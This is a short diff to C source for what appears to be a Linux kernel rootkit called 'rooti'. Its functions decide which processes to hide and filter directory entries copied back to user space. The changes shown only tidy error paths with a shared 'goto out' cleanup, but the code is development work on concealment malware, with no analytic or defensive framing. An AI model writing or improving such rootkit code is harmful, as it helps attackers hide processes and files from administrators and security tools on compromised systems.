@@ -78,16 +78,14 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record)
 
     pid_struct = find_vpid(pid);
     if (pid_struct == NULL) {
-        rcu_read_unlock();
         ROOTI_DEBUG("find_vpid() failed");
-        return false;
+        goto out;
     }
 
     task = pid_task(pid_struct, PIDTYPE_PID);
     if (task == NULL) {
-        rcu_read_unlock();
         ROOTI_DEBUG("pid_task() failed");
-        return false;
+        goto out;
     }
 
     while (task != &init_task) {
@@ -98,6 +96,7 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record)
         task = rcu_dereference(task->real_parent);
     }
 
+out:
     rcu_read_unlock();
     return false;
 #endif
@@ -152,8 +151,7 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     ret = copy_from_user(kernel_buf, user_buf, count);
     if (ret > 0) {
         ROOTI_DEBUG("copy_from_user() failed: %d", ret);
-        kfree(kernel_buf);
-        return count;
+        goto out;
     }
 
     count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir);
@@ -161,8 +159,10 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     ret = copy_to_user(user_buf, kernel_buf, count);
     if (ret > 0) {
         ROOTI_DEBUG("copy_to_user() failed: %d", ret);
+        goto out;
     }
 
+out:
     kfree(kernel_buf);
     return count;
 }
